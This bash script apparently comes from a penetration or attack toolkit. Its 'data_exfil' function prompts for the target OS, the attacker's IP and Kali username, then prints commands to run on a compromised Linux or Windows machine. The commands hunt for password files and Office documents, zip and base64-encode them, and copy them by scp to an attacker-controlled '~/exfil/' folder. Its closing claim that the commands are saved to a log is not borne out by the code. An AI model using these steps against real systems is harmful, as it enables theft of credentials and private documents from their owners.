#!/bin/bash

data_exfil() {

    local OS_CHOICE ATTACKER_IP ATTACKER_USER ZIP_NAME

    # Choose target OS
    echo "[?] What OS is the target?"
    echo "    1) Linux"
    echo "    2) Windows"
    read -p "[?] Enter choice: " OS_CHOICE

    # Ask for attacker details
    read -p "[?] Enter your IP address: " ATTACKER_IP
    read -p "[?] Enter your username on Kali: " ATTACKER_USER
    read -p "[?] Enter zip file name (e.g. data.zip): " ZIP_NAME

    echo ""
    echo "========================================"
    echo "  Copy these commands and run them ON THE TARGET MACHINE"
    echo "========================================"
    echo ""

    if [[ "$OS_CHOICE" == "1" ]]; then
        echo "[+] Linux Commands:"
        echo ""
        echo "Step 1 - Find sensitive files:"
        echo "  find / -name '*password*' 2>/dev/null"
        echo "  find / -name '*.docx' 2>/dev/null"
        echo "  find / -name '*.xlsx' 2>/dev/null"
        echo ""
        echo "Step 2 - Compress files:"
        echo "  zip -r $ZIP_NAME /path/to/files"
        echo ""
        echo "Step 3 - Encode to base64:"
        echo "  base64 $ZIP_NAME > ${ZIP_NAME}.b64"
        echo ""
        echo "Step 4 - Send to your machine:"
        echo "  scp ${ZIP_NAME}.b64 $ATTACKER_USER@$ATTACKER_IP:~/exfil/"
        echo ""

    elif [[ "$OS_CHOICE" == "2" ]]; then
        echo "[+] Windows Commands:"
        echo ""
        echo "Step 1 - Find sensitive files:"
        echo "  dir /s /b C:\*password* 2>nul"
        echo "  dir /s /b C:\*.docx 2>nul"
        echo "  dir /s /b C:\*.xlsx 2>nul"
        echo ""
        echo "Step 2 - Compress files:"
        echo "  powershell Compress-Archive -Path C:\path\to\files -DestinationPath $ZIP_NAME"
        echo ""
        echo "Step 3 - Encode to base64:"
        echo "  certutil -encode $ZIP_NAME ${ZIP_NAME}.b64"
        echo ""
        echo "Step 4 - Send to your machine:"
        echo "  scp ${ZIP_NAME}.b64 $ATTACKER_USER@$ATTACKER_IP:~/exfil/"
        echo ""
    else
        echo "[!] Invalid choice."
        return
    fi

    echo "[+] Commands saved to log."
}
